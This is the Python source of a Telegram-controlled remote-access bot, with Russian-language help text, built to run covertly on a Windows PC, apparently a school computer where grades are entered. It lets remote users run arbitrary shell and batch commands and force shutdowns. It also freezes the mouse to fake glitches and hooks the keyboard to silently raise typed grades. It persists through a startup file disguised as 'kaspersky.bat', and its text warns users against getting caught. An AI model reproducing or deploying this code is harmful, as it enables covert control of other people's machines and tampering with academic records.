import shutil
import time
import telebot
import config
import pyautogui
from time import sleep
import random
import keyboard
from threading import Thread
import os
# from playsound import playsound
# positionX = 500
# positionY = 500

#################################################
Admin_one = 1111111
Admin_2 = 1111111
# Enter your id, root rights (format int)



key = config.KEY

from cryptography.fernet import Fernet


def encrypt(filename, key):
# Зашифруем файл и записываем его
    f = Fernet(key)


    with open(filename, 'rb') as file:
        # прочитать все данные файла
        file_data = file.read()

    print(file_data)
    encrypted_data = f.encrypt(file_data)
    print(encrypted_data)

    with open(filename, 'wb') as file:
        file.write(encrypted_data)


def decrypt(filename, key):
# Расшифруем файл и записываем его
    f = Fernet(key)
    with open(filename, 'rb') as file:
        # читать зашифрованные данные
        encrypted_data = file.read()
    # расшифровать данные
    decrypted_data = f.decrypt(encrypted_data)
    # записать оригинальный файл
    # print(decrypted_data)
    with open(filename, 'wb') as file:
        file.write(decrypted_data)



################################################# конфиг
bot = telebot.TeleBot(config.TOKEN)
pyautogui.PAUSE = 0.01
pyautogui.FAILSAFE = False
################################################# Файл настроек
padawan = []
Jedi = []





def Write():
    global padawan
    global Jedi
    try:
        decrypt('padawan.txt', key)
        file = open("padawan.txt", "r", encoding='utf-8')
        padawan = file.readlines()
        file.close()
        encrypt('padawan.txt', key)
        # print(padawan)
    except:
        file = open("padawan.txt", "w", encoding='utf-8')
        file.close()
        encrypt('padawan.txt', key)


    try:
        decrypt('Jedi.txt', key)
        file = open("Jedi.txt", "r", encoding='utf-8')
        Jedi = file.readlines()
        file.close()
        encrypt('Jedi.txt', key)
        # print(Jedi)
    except:
        file = open("Jedi.txt", "w", encoding='utf-8')
        encrypt('Jedi.txt', key)
        file.close()
        bot.send_message(Admin_one, f'Installation is complete')
        bot.send_message(Admin_2, f'Installation is complete')

Write()
############################################## переменные времени и остановок
time_sleep_appraisals = 0 # остановка для оценок
time_sleep = 0
print(os.getcwd())
globals()



def schedule_loop(bot, text_bat_stop=None):# БОТ
    while True:
        @bot.message_handler(commands=['start', 'help'])
        def start(message):
            bot.send_message(message.from_user.id, f"Привет\n"
                                                   f"Это бот по управлению пк, если ты это читаешь, то все уже знаешь, так что не будем затягивать. \n"
                                                   f"\n"
                                                   f"ВНИМАНИЕ!!!\n"
                                                   f"На разработку этой штуки было потраченно куча времени, так что я очень надеюсь на твою сознательность \n"
                                                   f"\n"
                                                   f"Так, у нас есть три уровня доступа, и именно:\n"
                                                   f"1. Начальный - можно только остановить выполнение скрипта. Как я и говорил я надеюсь на твою сознательность, так что просьба не останавливать скрипт без должной необходимости.\n"
                                                   f"А именно: Если работает хороший учитель, а также если выступает ученик. Останавливать скрипт не советую, так как он может и тебе исправить оценку, так что не вставляй себе палки в колеса. Заранее спасибо\n"
                                                   f""
                                                   f"/good_grades - повысить оценку, доступно раз в 20 минут, при этом отключается рандомная расстановка, так что пользуйтесь аккуратно \n\n"
                                                   f"/sleep_bot - останавливает бота на 20 минут"
                                                   f"\n\n"
                                                   f"2. Падаваны - люди имеющие доступ к шалостям. Но как говорится: 'Чем больше сила - тем больше и ответственность'\n"
                                                   f"/mouse_stop time- остановить мышку на time секунд \n"
                                                   f"/sleep_pc time - выключить комп через time секунд \n"
                                                   f"/padawan_start"
                                                   f"\n\n"
                                                   f"3. Джедаи - элита, имеют доступ ко все фунциям бота, но при этом 'Оно тебе на надо...'. Джедаи обладают обширными знаниями в программирование и информационной безопасности."
                                                   f"Если ты не обладаешь такими данными, то тогда это точно не для тебя. Тут идет низкоуровневая настройка бота и системы, короче страшно. \n"
                                                   f"/Jedi_start")


            print(1)

        @bot.message_handler(commands=['sleep_bot'])
        def sleep_bot(message):
            global time_sleep_appraisals
            global time_sleep
            time_sleep_appraisals = 1
            time_sleep = time.time()
            bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20*60)}')
            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                    f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')

            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                    f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')

        @bot.message_handler(commands=['padawan_start'])
        def padawan_start(message):
            Write()

            print(padawan)
            print(message.from_user.id)
            id = str(message.from_user.id) + '\n'
            if (id in padawan) or (message.from_user.id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                bot.send_message(message.from_user.id, f"/good_grades - повысить оценку, доступно раз в 20 минут, при этом отключается рандомная расстановка, так что пользуйтесь аккуратно \n\n"
                                                       f"/sleep_bot - останавливает бота на 20 минут \n\n"
                                                       f"/mouse_stop time - не дает пользоваться мышкой time секунд. Имитирует дикие глюки. Если поставить большое время, то можно быстро спалиться\n\n"
                                                       f"/sleep_pc time - выключить комп через time секунд \n\n"
                                                       f"/sleep_pc_no_inform - Сразу отключает компьютер (без предупреждения)")
            else:
                bot.send_message(message.from_user.id, f"Нет доступа")

        @bot.message_handler(commands=['Jedi_start'])
        def Jedi_start(message):
            Write()
            id = str(message.from_user.id) + '\n'
            if (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                bot.send_message(message.from_user.id, f"/good_grades - повысить оценку, доступно раз в 20 минут, при этом отключается рандомная расстановка, так что пользуйтесь аккуратно \n\n"
                                                       f"/sleep_bot - останавливает бота на 20 минут \n\n"
                                                       f"/mouse_stop time - не дает пользоваться мышкой time секунд. Имитирует дикие глюки. Если поставить большое время, то можно быстро спалиться\n\n"
                                                       f"/sleep_pc time - выключить комп через time секунд \n\n"
                                                       f"/sleep_pc_no_inform - Сразу отключает компьютер \n\n"
                                                       f"/cmd - выводит одну команду в cmd. Печатать с новой строки\n\n"
                                                       f"/cmd_bat - выводит несколько команд в cmd. Печатать с новой строки \n\n"
                                                       f"/padawan_write - добавление Падаванов. Пишем команду и через пробел id человека. Узнать можно вот тут (переслать сообщение) @my_id_bot ")
            else:
                bot.send_message(message.from_user.id, f"Нет доступа")

        @bot.message_handler(commands=['padawan_write'])
        def file_write(message):
            try:
                Write()
                id = str(message.from_user.id) + '\n'
                if (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                    file_config = message.text
                    file_config = str(file_config)
                    print(file_config[15:])
                    decrypt('padawan.txt', key)
                    f = open("padawan.txt", 'a', encoding="utf-8")
                    f.write(f'{file_config[15:]}\n')
                    f.close()
                    encrypt('padawan.txt', key)
                    bot.send_message(message.from_user.id, f"Ok")
                    print(1)
                    bot.send_message(Admin_one, f"{message.from_user.id} добавил {file_config[15:]}")
                    bot.send_message(Admin_2, f"{message.from_user.id} добавил {file_config[15:]}")
                else:
                    bot.send_message(message.from_user.id, f"Нет доступа")
                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                            f'Нет доступа')

                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                             'Нет доступа')
                Write()
            except:
                bot.send_message(message.from_user.id, f'ERROR')

        @bot.message_handler(commands=['Jedi_write'])
        def config_write(message):
            Write()
            id = str(message.from_user.id) + '\n'
            if (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                file_config = message.text
                file_config = str(file_config)
                print(file_config[15:])
                decrypt('Jedi.txt', key)
                f = open("Jedi.txt", 'a', encoding="utf-8")
                f.write(f'{file_config[12:]}\n')
                f.close()
                encrypt('Jedi.txt', key)
                bot.send_message(message.from_user.id, f"Ok")
                print(1)
            else:
                bot.send_message(message.from_user.id, f"Нет доступа")

            # 1 - время задержки в сек

        @bot.message_handler(commands=['cmd'])
        def cmd(message):
            try:
                id = str(message.from_user.id) + '\n'
                if (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                    cmd = message.text
                    cmd = str(cmd).split('\n')
                    cmd = cmd[1:]
                    for i in cmd:
                        print(i)
                        bot.send_message(message.from_user.id, f"Go: {i}")
                        os.popen(i)

                        bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                f'Go: {i}')

                        bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                 f'Go: {i}')
                else:
                    bot.send_message(message.from_user.id, f"Нет доступа")
            except:
                bot.send_message(message.from_user.id, f'ERROR')

        @bot.message_handler(commands=['mouse_stop'])
        def mouse_go(message):
            try:
                id = str(message.from_user.id) + '\n'
                if time_sleep_appraisals == 0:
                    Write()
                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                        print(1)
                        g = int(message.text[11:])
                        print(g)

                        time_input = time.time()
                        print(time_input, time.time())
                        while True:
                            if (time.time() - time_input) <= g:
                                position = str(pyautogui.position())
                                position = position.split('=')
                                # print(position)
                                position1 = position[1]
                                position2 = position[2]
                                positionX = int(position1[:-3])
                                positionY = int(position2[:-1])
                                print(positionX, positionY)
                                pyautogui.moveTo(positionX, positionY, duration=2)


                            else:

                                bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n')
                                bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                                break
                    else:
                        bot.send_message(message.from_user.id, f"Нет доступа")
                else:
                    bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
            except:
                bot.send_message(message.from_user.id, f'ERROR')

        @bot.message_handler(commands=['sleep_pc'])
        def sleep(message):
            try:
                id = str(message.from_user.id) + '\n'
                if (time_sleep_appraisals == 0) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                    Write()
                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                        os.popen(f'shutdown -s -t {message.text[9:]}')
                        bot.send_message(message.from_user.id, f'Ок')
                        bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')

                        bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                    else:
                        bot.send_message(message.from_user.id, f"Нет доступа")
                else:
                    bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                            f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')

                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                             f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')

            except:
                try:
                    os.system(f'shutdown -s -t {message.text[9:]}')
                    bot.send_message(message.from_user.id, f'Ок')
                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')

                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                except:
                    bot.send_message(message.from_user.id, f'ERROR')

        @bot.message_handler(commands=['sleep_pc_no_inform'])
        def sleep_info(message):
            try:
                id = str(message.from_user.id) + '\n'
                if (time_sleep_appraisals == 0) or (message.from_user.id == Admin_2) or (message.from_user.id == Admin_one):
                    Write()
                    if (id in padawan) or (id in Jedi) or (message.from_user.id == Admin_2) or (
                            message.from_user.id == Admin_one):

                        bot.send_message(message.from_user.id, f'Ок')
                        bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')

                        bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                        time.sleep(1)
                        os.popen(f'shutdown -p')
                    else:
                        bot.send_message(message.from_user.id, f"Нет доступа")
                else:
                    bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                            f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')

                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                             f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')

            except:
                try:

                    bot.send_message(message.from_user.id, f'Ок')
                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}" \n')

                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                    time.sleep(1)
                    os.system(f'shutdown -p')
                except:
                    bot.send_message(message.from_user.id, f'ERROR')

        @bot.message_handler(commands=['cmd_bat'])
        def cmd_bat(message):
            try:
                id = str(message.from_user.id) + '\n'
                if (id in Jedi) or (id == Admin_2) or (message.from_user.id == Admin_one):
                    cmd = message.text
                    cmd = str(cmd).split('\n')
                    cmd = cmd[1:]
                    cmd_output = ''
                    for i in cmd:
                        cmd_output = cmd_output + i + '\n'
                    print(cmd_output)

                    file_cmd = open('go.bat', 'w', encoding='utf-8')
                    file_cmd.write(cmd_output)
                    file_cmd.close()
                    time.sleep(3)
                    os.system('go.bat')
                    time.sleep(5)
                    os.remove('go.bat')
                    bot.send_message(message.from_user.id, f"Команда выполнена")

                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n')

                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n')
                else:
                    bot.send_message(message.from_user.id, f"Нет доступа")
            except:
                bot.send_message(message.from_user.id, f'ERROR')

        @bot.message_handler(commands=['delete_bot'])
        def delete_bot(message):
            id = str(message.from_user.id) + '\n'
            if (id == Admin_2) or (message.from_user.id == Admin_one):
                Write()

                bot.send_message(Admin_one, f"Ну чтож, я очень рад был вам служить. Удачи)")
                bot.send_message(Admin_2, f"Ну чтож, я очень рад был вам служить. Удачи)")

                bot.send_message(Admin_one, f"padawan \n{padawan}")
                bot.send_message(Admin_2, f"padawan \n{padawan}")
                bot.send_message(Admin_one, f"Jedi \n{Jedi}")
                bot.send_message(Admin_2, f"Jedi \n{Jedi}")


                os.remove(rf'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kaspersky.bat')
                os.remove('C:\Program Files\SystemA\padawan.txt')
                os.remove('C:\Program Files\SystemA\Jedi.txt')
                os.startfile('Sis.exe', 'runas')
                os.startfile('1.bat', 'runas')

                print(100)
                time.sleep(5)
                bot.send_message(message.from_user.id, f"Удаление прошло не до конца")
                bot.send_message(Admin_one, f"Удаление прошло не до конца")
                bot.send_message(Admin_2, f"Удаление прошло не до конца")
            else:
                bot.send_message(message.from_user.id, f"Нет доступа)")

        @bot.message_handler(commands=['good_grades'])
        def good_grades(message):
            caunt = 0
            a = ''
            global time_sleep_appraisals
            while True:
                if time_sleep_appraisals == 0:
                    b = a
                    a = keyboard.read_key()
                    print(a)
                    if a == b:
                        caunt = 3
                        if a == '2':
                            if caunt == 3:
                                pyautogui.press('backspace')

                                pyautogui.press('3')

                            a = ''
                            bot.send_message(message.from_user.id, f"Испривил 2 на 3")

                            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                    f'Испривил 2 на 3')
                            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                     f'Испривил 2 на 3')
                            time_sleep_appraisals = 1
                            break

                        elif a == '3':
                            if caunt == 3:
                                pyautogui.press('backspace')

                                pyautogui.press("4")

                            a = ''
                            bot.send_message(message.from_user.id, f"Испривил 3 на 4")
                            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                    f'Испривил 3 на 4')
                            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                     f'Испривил 3 на 4')
                            time_sleep_appraisals = 1
                            break

                        elif a == '4':
                            if caunt == 3:
                                pyautogui.press('backspace')

                                pyautogui.press('5')

                            a = ''
                            bot.send_message(message.from_user.id, f"Испривил 4 на 5")
                            bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                                    f'Испривил 4 на 5')
                            bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                                     f'Испривил 4 на 5')
                            sleep_bot(message)
                            break
                else:
                    bot.send_message(message.from_user.id, f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
                    bot.send_message(Admin_2, f'{message.from_user.id} - "{message.text[1:]}"  \n'
                                            f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
                    bot.send_message(Admin_one, f'{message.from_user.id} - "{message.text[1:]}" \n'
                                             f'Бот спит до {time.ctime(time_sleep + 20 * 60)}')
                    break



        bot.polling(none_stop=True)



def schedule_loop2(bot):
    caunt = 0
    a = ''
    global time_sleep_appraisals
    while True:
        if time_sleep_appraisals == 0:
            b = a
            a = keyboard.read_key()
            print(a)
            if a == b:
                caunt = random.randint(1, 8)
                if a == '2':
                    if caunt == 3:
                        pyautogui.press('backspace')

                        pyautogui.press('3')


                    a = ''

                elif a == '3':
                    if caunt == 3:
                        pyautogui.press('backspace')

                        pyautogui.press("4")


                    a = ''

                elif a == '4':
                    if caunt == 3:
                        pyautogui.press('backspace')

                        pyautogui.press('5')


                    a = ''



def schedule_loop3(bot):
    global time_sleep_appraisals
    global time_sleep
    while True:

        if time.time() - time_sleep > 20*60:
            time_sleep_appraisals = 0
        # print(time.time())
        sleep(15)
        # print(time_sleep_appraisals)


Thread(target=schedule_loop, args=(bot,)).start()
Thread(target=schedule_loop2, args=(bot,)).start()
Thread(target=schedule_loop3, args=(bot,)).start()


